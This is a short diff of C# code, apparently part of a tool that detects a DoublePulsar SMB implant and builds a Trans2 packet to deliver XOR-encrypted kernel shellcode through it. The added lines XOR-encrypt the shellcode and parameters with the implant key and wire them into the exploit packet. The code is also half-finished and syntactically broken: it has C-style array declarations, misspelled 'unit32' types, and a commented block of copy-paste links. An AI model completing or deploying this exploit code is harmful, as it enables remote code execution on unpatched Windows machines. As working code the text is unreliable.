@@ -544,6 +544,7 @@ static public byte[] MakeKernelShellcode()
                     Console.WriteLine("DOUBLEPULSAR SMB IMPLANT DETECTED!!! Arch: {arch}, XOR Key: {key,4:X}");
 
                     //XorEncrypt the payload
+		    XorEncrypt(shellcode, key);
 
                     //Build DoublePulsar payload packet
                     byte[] doublepulsar_parameters[12];
@@ -551,10 +552,29 @@ static public byte[] MakeKernelShellcode()
                     unit32 chunk_size = 4096;
                     unit32 offset = 0x00;
                     //copy them to doublepulsar_parameters
+		     /*
+		     https://docs.microsoft.com/en-us/dotnet/api/system.buffer.memorycopy?view=net-5.0
+		     https://stackoverflow.com/questions/2996487/memcpy-function-in-c-sharp
+		     https://bytes.com/topic/c-sharp/answers/431682-how-do-memcpy-byte
+		     https://www.abstractpath.com/2009/memcpy-in-c/
+		     
+		     System.Array.Copy(byteA, 0, byteB, 0, 4);
+
+			Array.Copy()
+
+			Buffer.BlockCopy()
+		     
+			MemoryCopy(size_of_payload, doublepulsar_parameters, 4, 4);
+			MemoryCopy(chunk_size, doublepulsar_parameters + 4, 4, 4);
+			MemoryCopy(offset, doublepulsar_parameters + 8, 4, 4);
+			MemoryCopy (void* source, void* destination, ulong destinationSizeInBytes, ulong sourceBytesToCopy);
+			
+		     */
 
                     //XorEncrypt the parameters
+		    XorEncrypt(doublepulsar_parameters, key);
 
-                    byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, parameters, shellcode);
+                    byte[] doublepulsar_exploit_pkt = MakeTrans2Packet(header.TID, header.UID, doublepulsar_parameters, shellcode);
 
                     try
                     {
